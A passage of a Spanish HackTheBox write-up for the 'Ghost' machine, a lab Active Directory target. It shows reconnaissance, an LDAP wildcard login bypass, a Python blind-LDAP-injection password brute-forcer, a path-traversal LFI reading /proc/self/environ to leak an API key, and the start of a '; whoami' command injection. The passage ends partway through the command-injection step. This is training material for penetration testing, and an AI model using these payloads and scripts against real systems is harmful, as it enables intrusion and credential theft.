---
title: Ghost - Insane (HTB)
permalink: /Ghost-HTB-Writeup/
tags:
  - "Windows"
  - "Insane"
  - "LDAP Injection"
  - "Python Scripting"
  - "API Abuse"
  - "SSH Multiplexing"
  - "ADIDNS Poisoning"
  - "Stealing Net-NTLMv2 Hash"
  - "ReadGMSAPassword"
  - "gMSA Abuse"
  - "BloodHound"
  - "Golden SAML"
  - "Golden Ticket"
  - "DC Sync"
  - "Hash Cracking"
  - "PassTheHash"
  - "xp_cmdshell"
  - "Powershell"
  - "Mimikatz"
  - "SeImpersonatePrivilege"
  - "EfsPotato.exe"
  - "Proxychains"
  - "Chisel"
  - "Port Forwarding"
categories:
  - writeup
  - hacking
  - hackthebox
  - "active directory"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo_tittle: Ghost - Insane (HTB)
seo_description: Practica habilidades de enumeración, explotación de vulnerabilidades y abuso de permisos en Active Directory. Aprende técnicas avanzadas para escalar privilegios para obtener control total dentro de Ghost.
excerpt: Practica habilidades de enumeración, explotación de vulnerabilidades y abuso de permisos en Active Directory. Aprende técnicas avanzadas para escalar privilegios para obtener control total dentro de Ghost.
header:
  overlay_image: /assets/images/headers/ghost-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/ghost-hackthebox.jpg
---

![image-center](/assets/images/posts/ghost-hackthebox.png){: .align-center}

**Habilidades:** Virtual Hosting, LDAP Injection, Blind LDAP Injection - Credential Brute Forcing (Python Scripting), Local File Inclusion (GhostCMS), Abusing Ghost CMS Api (Command Injection), Abusing SSH Multiplexing, ADIDNS Poisoning - `dnstool.py`, Stealing NetNTLMv2 Hashes With `Responder.py`, Hash Cracking (NetNTLMv2), DC Enumeration (SharpHound.exe), ReadGMSAPassword, PassTheHash (Evil-WinRM), Golden SAML Attack using `ADFSpoof.py`, Abusing SQL Server `xp_cmdshell` to RCE, Powershell Reverse Shell Obfuscation (PowerJoker), Abusing SeImpersonatePrivilege (EfsPotato.exe) [Local Privilege Escalation], DCSync Using Mimikatz, Golden Ticket Attack - Requesting TGT using `ticketer.py`, Port Forwarding with Chisel, PassTheTicket, Shadow Credentials [Privilege Escalation], Golden Ticket Attack using Bash Scripting
{: .notice--primary}

# Introducción

Ghost es una máquina Windows de dificultad `Insane` perteneciente a la plataforma de Hackthebox. Esta máquina simulan entorno de Active Directory donde debemos emplear técnicas avanzadas de enumeración y explotación para comprometer sistema. Existen diversos servicios configurados y sitios web dentro de este entorno, los cuales debemos aprovechar para hacer una intrusión a la máquina. En la escaladabusaremos de servicios de Active Directory mal configurados, los que nos permitirán hacernos con el control del dominio.

<br>

# Reconocimiento
---
Primeramente comprobaremos que tenemos conectividad con la máquina víctima

~~~ bash
ping -c 1 10.10.11.24
PING 10.10.11.24 (10.10.11.24) 56(84) bytes of data.
64 bytes from 10.10.11.24: icmp_seq=1 ttl=127 time=147 ms

--- 10.10.11.24 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 147.459/147.459/147.459/0.000 ms
~~~

Enviamos un paquete y la máquina nos responde correctamente con el paquete ICMP de vuelta


## Nmap Scanning

Lanzaremos un escaneo para detectar puertos abiertos en la máquina víctima, en este caso aplicaremos un escaneo exhaustivo a todos los puertos (`65535`). 

~~~ bash
nmap --open -sS -p- --min-rate 5000 -n -Pn 10.10.11.24 -oG openPorts

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8008/tcp  open  http
8443/tcp  open  https-alt
9389/tcp  open  adws
49443/tcp open  unknown
49664/tcp open  unknown
49671/tcp open  unknown
49678/tcp open  unknown
60382/tcp open  unknown
60437/tcp open  unknown
62757/tcp open  unknown
~~~

Haremos un escaneo sobre estos puertos abiertos que hemos encontrado, detectando la versión y el servicio que se ejecuta en cada puerto

~~~ bash
nmap -p 53,80,88,135,139,389,443,445,464,593,636,2179,3268,3269,3389,5985,8008,8443,9389,49443,49664,49671,49678,60382,60437,62757 -sVC 10.10.11.24 -oN services 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 22:10 EST
Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 76.92% done; ETC: 22:11 (0:00:10 remaining)
Nmap scan report for 10.10.11.24
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-18 03:10:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
443/tcp   open  https?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2025-02-16T22:17:08
|_Not valid after:  2025-08-18T22:17:08
|_ssl-date: 2025-02-18T03:12:34+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: GHOST
|   NetBIOS_Domain_Name: GHOST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ghost.htb
|   DNS_Computer_Name: DC01.ghost.htb
|   DNS_Tree_Name: ghost.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2025-02-18T03:11:57+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8008/tcp  open  http          nginx 1.18.0 (Ubuntu)
|_http-title: Ghost
|_http-generator: Ghost 5.78
| http-robots.txt: 5 disallowed entries 
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8443/tcp  open  ssl/http      nginx 1.18.0 (Ubuntu)
| http-title: Ghost Core
|_Requested resource was /login
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf        .NET Message Framing
49443/tcp open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60382/tcp open  msrpc         Microsoft Windows RPC
60437/tcp open  msrpc         Microsoft Windows RPC
62757/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-02-18T03:11:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.58 seconds
~~~

En este caso nos enfrentamos a un `Windows Server 2022`, podemos saberlo gracias al campo
- Podemos deducir que esta máquina se trata de un controlador de dominio por el nombre de `host` además de servicios como `kerberos`, `ldap` o `DNS`
- El dominio tiene como nombre `ghost.htb`
- Existen servicios HTTP funcionando en el DC, tales como el puerto `8443` o `8008`, que ejecutan `nginx`

Agregaremos tanto el dominio como el nombre de la máquina al archivo `/etc/hosts` para que nuestra máquina pueda resolver el dominio a la IP de la máquina víctima

~~~ bash
echo '10.10.11.24 ghost.htb dc01.ghost.htb' >> /etc/hosts
~~~


## RPC Enumeration (Failed)

Una de las validaciones más comunes en entornos de Active Directory es validar si las sesiones nulas son posibles, esto debemos comprobarlo tanto en `smb` como en otros protocolos como `rpc`

~~~ bash
rpcclient -U "" -N 10.10.11.24 -c "querydominfo"

result was NT_STATUS_ACCESS_DENIED
~~~

## Web Analysis
### Ghost CMS - Port `8008`

Exploraremos la web además de hacer un escaneo de las tecnologías web que se ejecutan en este servicio

~~~ bash
whatweb http://10.10.11.24:8008

http://10.10.11.24:8008 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.24], MetaGenerator[Ghost 5.78], Open-Graph-Protocol[website], Script[application/ld+json], Title[Ghost], X-Powered-By[Express], nginx[1.18.0]
~~~

![image-center](/assets/images/posts/ghost-ghost-cms-port_8008.png){: .align-center}

Parece ser que `Ghost` es el gestor de contenido que se utiliza para esta web (`GhostCMS`), el cual es de código abierto, podemos encontrarlo en un repositorio de `Github`


### Ghost Core - Port `8443`

Si exploramos el puerto `8443`, tendremos que usar el protocolo `https` para poder ver la web

~~~ bash
whatweb https://ghost.htb:8443
https://ghost.htb:8443 [302 Found] Cookies[connect.sid], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[connect.sid], IP[10.10.11.24], RedirectLocation[/login], X-Powered-By[Express], nginx[1.18.0]

https://ghost.htb:8443/login [200 OK] Cookies[connect.sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[connect.sid], IP[10.10.11.24], Title[Ghost Core], X-Powered-By[Express], nginx[1.18.0]
~~~

![image-center](/assets/images/posts/ghost-ghost-cms-port_8443.png){: .align-center}

Esta página resulta interesante para una posterior investigación debido a la pista que se nos brinda acerca de un inicio de sesión usando Servicios Federados de Active Directory (`ADFS`), que básicamente consiste en iniciar sesión en varios servicios mediante un solo conjunto de credenciales


## Virtual Hosting

Se nos aplica una redirección a `/login`, y al entrar vemos un botón con el mensaje de `Login using AD Federation`. Esto es interesante, al hacer click en el botón se nos redirige al siguiente subdominio

~~~ text
https://federation.ghost.htb/adfs/ls/?SAMLRequest=nVPBbuIwEP2...
~~~

Se envía una solicitud SAML a `federation.ghost.htb`, o sea que se está aplicando `Virtual Hosting`. Agregaremos `federation.ghost.htb` al archivo `/etc/hosts` para poder ver la web con el siguiente comando

~~~ bash
sed -i "/^10.10.11.24/s/$/ federation.ghost.htb/" /etc/hosts

cat /etc/hosts | grep ghost.htb

10.10.11.24 ghost.htb DC01.ghost.htb federation.ghost.htb
~~~


## ADFS Sign-in - `federation.ghost.htb`

Si ahora volvemos a acceder al enlace nuevo, tendremos acceso a lo que aparenta ser un login de `ADFS` (`Active Directory Federation Services`)

![image-center](/assets/images/posts/ghost-ghost-adfs-signin.png){: .align-center}


## Ghost CMS Admin Panel

No necesitamos hacer fuzzing dado que el proyecto es de código abierto. Investigando un poco el repositorio oficial de `Ghost CMS`, vemos que cuenta con una carpeta `ghost`, si exploramos desde el navegador nos redirige a lo siguiente

![image-center](/assets/images/posts/ghost-ghost-cms-admin-panel.png){: .align-center}

## Subdomain Fuzzing

Intentaremos averiguar si existen subdominios válidos con `ffuf`, utilizando filtros para la respuesta del servidor, en mi caso estaré filtrando por las líneas de la respuesta con el parámetro `--fl`

~~~ bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://ghost.htb:8008 -H 'Host: FUZZ.ghost.htb' --fl 185

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://ghost.htb:8008
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.ghost.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 185
________________________________________________

intranet                [Status: 307, Size: 3968, Words: 52, Lines: 1, Duration: 679ms]
~~~

- `-w`: Diccionario a utilizar
- `-u`: URL
- `-H`: Definir una cabecera HTTP o `HTTP Header`
- `--fl`: Ocultar la cantidad de líneas de la respuesta, en este caso, `185`


## Ghost Intranet Login

Descubrimos un subdominio `intranet`, lo agregaremos al archivo `/etc/hosts` para que la línea donde se encuentra la IP de `Ghost` luzca más o menos de la siguiente manera

~~~ text
10.10.11.24 ghost.htb DC01.ghost.htb federation.ghost.htb intranet.ghost.htb
~~~

Navegaremos hasta `intranet.ghost.htb:8008`, se nos mostrará la siguiente página

![image-center](/assets/images/posts/ghost-ghost-intranet-login.png){: .align-center}

Nos redirige a `/login` y se nos muestra un panel de inicio de sesión, podemos probar diversos tipos de detecciones, no sin antes hacer un análisis de la solicitud HTTP con `Burpsuite`


## Burpsuite Analysis

Interceptamos la solicitud y la enviamos al `Repeater`, podremos ver la respuesta del servidor ante un intento de iniciar sesión

![image-center](/assets/images/posts/ghost-burpsuite-analysis.png){: .align-center}

Como nombre de usuario y contraseña se usa el nombre `1_ldap-username` y `1_ldap-secret`, esto nos da información de que quizá la autenticación se realiza mediante el protocolo LDAP


## LDAP Injection

En este inicio de sesión las queries de LDAP más o menos se tramitarían de la siguiente manera

~~~ bash
(uid=test)(password=test)
~~~

Es por esto que podemos usar una `wildcard` utilizando el caracter `*` (que representa cualquier valor) para hacer `bypass` de la autenticación, entonces estaríamos manipulando la consulta para que se represente así

~~~ bash
(uid=*)(password=*)
~~~

Una vez entendido este concepto, procedemos a hacer la inyección a LDAP iniciando sesión como el usuario `*` con la contraseña `*` (sarcasmo)

![image-center](/assets/images/posts/ghost-ldap-injection-wildcard.png){: .align-center}

Entramos como el usuario `kathryn.holland`, y se nos muestran secciones de noticias, usuarios y un foro

![image-center](/assets/images/posts/ghost-login-as-kathryn.png){: .align-center}

## Kerberos User Validation

Guardamos los nombres de usuario en un archivo `users.txt`, y como `kerberos` se encuentra expuesto, podremos usar `kerbrute` para validar estos usuarios a nivel de dominio

Para hacer menos tediosa la forma de almacenar los nombres de las cuentas, enviaremos una solicitud HTTP para luego filtrar por expresiones regulares que nos muestren únicamente nombres de usuarios. Para que podamos acceder a la sesión del usuario, debemos enviar una cookie que contiene un `JSON Web Token` que valida nuestra sesión en el navegador

~~~ bash
curl -sLX GET http://intranet.ghost.htb:8008/users -H 'Cookie: token=Bearer%20eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NDI0ODk4MjgsImlhdCI6MTczOTg5NzgyOCwidXNlciI6eyJ1c2VybmFtZSI6ImthdGhyeW4uaG9sbGFuZCJ9fQ.T5RHxN5Vj4Dl3tsQaYYjUxeWRrKtVj-ql1nAXc_oPXY' | grep -oP '(?<=<th>)(\w+\.\w+)(?=</th>)' > users.txt

kathryn.holland
cassandra.shelton
robert.steeves
florence.ramirez
justin.bradley
arthur.boyd
beth.clark
charles.gray
jason.taylor
~~~

Una vez tenemos el listado de archivos, procederemos con la validación de estos usuarios de cara al protocolo `kerberos` con la herramienta `kerbrute`

~~~ bash
kerbrute userenum -d ghost.htb --dc 10.10.11.24 users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/18/25 - Ronnie Flathers @ropnop

2025/02/18 14:52:03 >  Using KDC(s):
2025/02/18 14:52:03 >  	10.10.11.24:88

2025/02/18 14:52:04 >  [+] VALID USERNAME:	cassandra.shelton@ghost.htb
2025/02/18 14:52:04 >  [+] VALID USERNAME:	florence.ramirez@ghost.htb
2025/02/18 14:52:04 >  [+] VALID USERNAME:	robert.steeves@ghost.htb
2025/02/18 14:52:04 >  [+] VALID USERNAME:	kathryn.holland@ghost.htb
2025/02/18 14:52:04 >  [+] VALID USERNAME:	justin.bradley@ghost.htb
2025/02/18 14:52:04 >  [+] VALID USERNAME:	arthur.boyd@ghost.htb
2025/02/18 14:52:04 >  [+] VALID USERNAME:	beth.clark@ghost.htb
2025/02/18 14:52:04 >  [+] VALID USERNAME:	charles.gray@ghost.htb
2025/02/18 14:52:04 >  [+] VALID USERNAME:	jason.taylor@ghost.htb
2025/02/18 14:52:04 >  Done! Tested 9 usernames (9 valid) in 0.158 seconds
~~~


## Forum - `gitea`

Podremos notar una publicación que hace alusión a una migración desde `gitea` a `bitbucket`. Además se menciona que al servicio de `gitea` solo podremos acceder con la cuenta `gitea_temp_principal`

![image-center](/assets/images/posts/ghost-forum-gitea.png){: .align-center}

Si hacemos una solicitud usando un subdominio `gitea` a `ghost.htb:8008`, vemos que el subdominio existe porque vemos la siguiente respuesta

~~~ bash
curl -sX GET http://ghost.htb:8008 -H 'Host: gitea.ghost.htb:8008' | head
<!DOCTYPE html>
<html lang="en-US" class="theme-auto">
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Gitea: Git with a cup of tea</title>
	<link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2dpdGVhLmdob3N0Lmh0Yjo4MDA4LyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vZ2l0ZWEuZ2hvc3QuaHRiOjgwMDgvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9naXRlYS5naG9zdC5odGI6ODAwOC9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaXplcyI6IjUxMng1MTIifV19">
	<meta name="author" content="Gitea - Git with a cup of tea">
	<meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go">
	<meta name="keywords" content="go,git,self-hosted,gitea">
	<meta name="referrer" content="no-referrer">
~~~

Si hacemos una solicitud a un subdominio con otro nombre veremos una respuesta diferente

~~~ bash
curl -sX GET http://ghost.htb:8008 -H 'Host: cualquiercosa.ghost.htb:8008' | head
<!DOCTYPE html>
<html lang="en">
<head>

    <title>Ghost</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=c068d14f43">
    <link rel="preload" as="script" href="/assets/built/source.js?v=c068d14f43">
~~~

Debemos agregar al archivo `/etc/hosts` el subdominio `gitea.ghost.htb` para que nuestra máquina resuelva este subdominio a la dirección IP de la máquina víctima

~~~ bash
10.10.11.24 ghost.htb DC01.ghost.htb federation.ghost.htb intranet.ghost.htb gitea.ghost.htb
~~~

Ahora podremos visitar `gitea.ghost.htb:8008`, veremos la página principal de `Gitea`

![image-center](/assets/images/posts/ghost-gitea-index.png){: .align-center}

Podemos iniciar sesión, pero como por el momento no contamos con credenciales, no podremos acceder a este servicio

![image-center](/assets/images/posts/ghost-gitea-signin.png){: .align-center}


## Blind LDAP Injection - Credential Brute Forcing (Python Scripting)

Aprovecharemos la inyección de LDAP para descubrir credenciales. Para automatizar un ataque de fuerza bruta, podemos crear el siguiente script en `python` que realiza intentos de adivinar la contraseña caracter por caracter aprovechando la wildcard (`*`), agregando cada caracter al principio de la solicitud

- `ldap-secret: a*`
- `ldap-secret: a*` 
- `ldap-secret: af*`
- `ldap-secret: af2*`

De esta forma, si `a` forma parte de la contraseña, se avanza de posición hasta descubrir la contraseña completa

~~~ python
from pwn import *
import string, requests, signal

characters = string.ascii_lowercase + string.digits
url = 'http://intranet.ghost.htb:8008/login'
target_user='gitea_temp_principal'
headers = {
    'Host': 'intranet.ghost.htb:8008',
    'Next-Action': 'c471eb076ccac91d6f828b671795550fd5925940',
    'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
}

def def_handler(sig, frame):
    log.warn('Saliendo...')
    sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

def brute():
    secret_user = ''
    bar = log.progress("Attacking http://intranet.ghost.htb:8008/login...")
    # Fuerza Bruta
    while True:
        for char in characters:
            bar.status(f"\nProbando el caracter: {char}")
            request_files = {
                '1_ldap-username': (None, target_user),
                '1_ldap-secret': (None, f'{secret_user}{char}*'),
                '0': (None, '[{},"$K1"]')
                }
                
            req = requests.post(url, headers=headers, files=request_files)
            if req.status_code == 303:
                secret_user += char
                print("Password: " + secret_user)
                break

        files_full_pass = { '1_ldap-username': (None, target_user), '1_ldap-secret': (None, secret_user), '0': (None, '[{}, "$K1"]')}
        validate_pass = requests.post(url, headers=headers, files=files_full_pass)
        if validate_pass.status_code == 303:
            print("\nFull password for " + target_user + ": " + secret_user)
            sys.exit(1)

if __name__ == "__main__":
    brute()
~~~

Lanzamos el script y tendremos que esperar un momento para que se encuentre la contraseña, cuando esté completa, se validará enviando la contraseña completa

~~~ bash
python3 brute_ldap.py
[◤] Attacking http://intranet.ghost.htb:8008/login...: 
    Probando el caracter: f
Password: s
Password: sz
Password: szr
Password: szrr
Password: szrr8
Password: szrr8k
Password: szrr8kp
Password: szrr8kpc
Password: szrr8kpc3
Password: szrr8kpc3z
Password: szrr8kpc3z6
Password: szrr8kpc3z6o
Password: szrr8kpc3z6on
Password: szrr8kpc3z6onl
Password: szrr8kpc3z6onlq
Password: szrr8kpc3z6onlqf

Full password for gitea_temp_principal: szrr8kpc3z6onlqf
~~~


## `Gitea` - Repositories Analysis

Volveremos a `gitea` e iniciaremos sesión como `gitea_temp_principal`, veremos dos repositorios, `blog` e `intranet`

![image-center](/assets/images/posts/ghost-gitea-repos.png){: .align-center}

Si exploramos el repositorio `intranet`, en el archivo `README.md` vemos el siguiente mensaje

![image-center](/assets/images/posts/ghost-gitea-repo-intranet.png){: .align-center}

Se nos dice que se encuentra una API expuesta bajo el subdominio `intranet.ghost.htb/api-dev`. Además vemos que se nos deja una `API Key` en el repositorio `blog`

![image-center](/assets/images/posts/ghost-gitea-repo-blog.png){: .align-center}

Además se nos menciona que la corporación está planeando implementar una nueva funcionalidad en el blog. Una conexión con la intranet, como está en desarrollo se usa una clave API como variable de entorno definida en la máquina con el nombre `DEV_INTRANET_KEY`


### Ghost CMS Content API

En Ghost CMS existe una api de contenido destinada a la consulta de la información que se publica dentro de este CMS. Sin embargo, la autorización a este recurso se gestiona mediante una clave de API, podemos usar la `API key` para enviar una solicitud HTTP y así consultar información, la ruta está en `/ghost/api/content`

- https://ghost.org/docs/content-api/

![image-center](/assets/images/posts/ghost-ghost-cms-apidoc.png){: .align-center}

Una vez comprendimos como se tramita la autorización de cualquier usuario que contenga la clave API, la usaremos en nuestra consulta mediante `curl`. En mi caso usaré `jq`
 para ver el formato `json` de forma más clara
 
~~~ bash
curl -sLX GET 'http://ghost.htb:8008/ghost/api/content/authors/?key=a5af628828958c976a3b6cc81a' | jq

{
  "authors": [
    {
      "id": "1",
      "name": "Kathryn Holland",
      "slug": "kathryn",
      "profile_image": null,
      "cover_image": null,
      "bio": null,
      "website": null,
      "location": null,
      "facebook": null,
      "twitter": null,
      "meta_title": null,
      "meta_description": null,
      "url": "http://ghost.htb/author/kathryn/"
    }
  ],
  "meta": {
    "pagination": {
      "page": 1,
      "limit": 15,
      "pages": 1,
      "total": 1,
      "next": null,
      "prev": null
    }
  }
}
~~~
<br>


# Intrusión / Explotación
---
## Local File Inclusion - Abusing Custom File Ghost CMS API

Investigando el repositorio `ghost`, existe un archivo `public-posts.js`, dentro de éste se encuentra la siguiente línea de código que luce un tanto interesante

![image-center](/assets/images/posts/ghost-lfi.png){: .align-center}

El parámetro `extra` hace referencia a la lectura de un archivo cuando consultamos el endpoint `posts` en la API, como no está sanitizado podemos intentar abusar de este parámetro

~~~ bash
curl -sLX GET 'http://ghost.htb:8008/ghost/api/content/posts?key=a5af628828958c976a3b6cc81a&extra={LFI_TEST}'
~~~

Usaremos este parámetro para incluir archivos locales de la máquina, en este caso más que ver los usuarios del sistema (metodología típica), podría interesarnos ver las variables de entorno definidas en el sistema, ya que en el archivo `README` se nos menciona que existe una variable de entorno `DEV_INTRANET_KEY`

~~~ bash
curl -sLX GET 'http://ghost.htb:8008/ghost/api/content/posts?key=a5af628828958c976a3b6cc81a&extra=../../../../proc/self/environ' | jq

{
  "posts": [
    {
      "id": "65bdd2dc26db7d00010704b5",
      "uuid": "22db47b3-bbf6-426d-9fcf-887363df82cf",
      "title": "Embarking on the Supernatural Journey: Welcome to Ghost!",
      "slug": "embarking-on-the-supernatural-journey-welcome-to-ghost",
      ...
      ...
      ...
    }
  ],
  "meta": {
    "pagination": {
      "page": 1,
      "limit": 15,
      "pages": 1,
      "total": 1,
      "next": null,
      "prev": null
    },
    "extra": {
      "../../../../proc/self/environ": "HOSTNAME=26ae7990f3dd\u0000database__debug=false\u0000YARN_VERSION=1.22.19\u0000PWD=/var/lib/ghost\u0000NODE_ENV=production\u0000database__connection__filename=content/data/ghost.db\u0000HOME=/home/node\u0000database__client=sqlite3\u0000url=http://ghost.htb\u0000DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe\u0000database__useNullAsDefault=true\u0000GHOST_CONTENT=/var/lib/ghost/content\u0000SHLVL=0\u0000GHOST_CLI_VERSION=1.25.3\u0000GHOST_INSTALL=/var/lib/ghost\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000NODE_VERSION=18.19.0\u0000GHOST_VERSION=5.78.0\u0000"
    }
  }
}
~~~

Vemos que listamos exitosamente el archivo al que apuntamos y también vemos una variable con nombre `DEV_INTRANET_KEY`, haremos un pequeño tratamiento de la consulta para ver únicamente lo que nos interesa

~~~ bash
curl -sLX GET 'http://ghost.htb:8008/ghost/api/content/posts?key=a5af628828958c976a3b6cc81a&extra=../../../../proc/self/environ' | tr '\\u0000' '\n' | grep DEV_INTRANET_KEY

DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe
~~~


## Command Injection 

Recordemos que se encuentra una API con el nombre `api-dev` bajo el subdominio de `intranet.ghost.htb:8008`

- Tenemos acceso al código desde el repositorio intranet, si eres curioso, notarás que existe un archivo `dev.rs` en el directorio `/intranet/backend/src/api`

![image-center](/assets/images/posts/ghost-command-injection-1.png){: .align-center}

Gracias a esta línea de código podemos deducir lo siguiente:

- Se captura la clave de API mediante un header HTTP (`X-DEV-INTRANET-KEY`)
- El servidor compara el valor que enviamos con la variable de entorno `DEV_INTRANET_KEY`
- Si la clave de API es válida se nos otorga acceso

Aprovecharemos la información que acabamos de descubrir para obtener acceso a la API. Si inspeccionamos el archivo `scan.rs`, veremos lo siguiente

![image-center](/assets/images/posts/ghost-command-injection-2.png){: .align-center}

### Exploiting

En este archivo se define un `endpoint` llamado `/scan`, el cual recibe un `JSON`, el cual debemos enviar un atributo `url`

~~~ rust
#[derive(Deserialize)]
pub struct ScanRequest {
    url: String,
}
~~~

Este dato se concatena al comando `intranet_url_check`, el cual se ejecuta a nivel de sistema. Lo preocupante en este caso sería que **la cadena que enviamos no se sanitiza**, por lo que en teoría podríamos abusar de este punto de entrada para inyectar un comando como argumento, por ejemplo: `; whoami`

~~~ bash
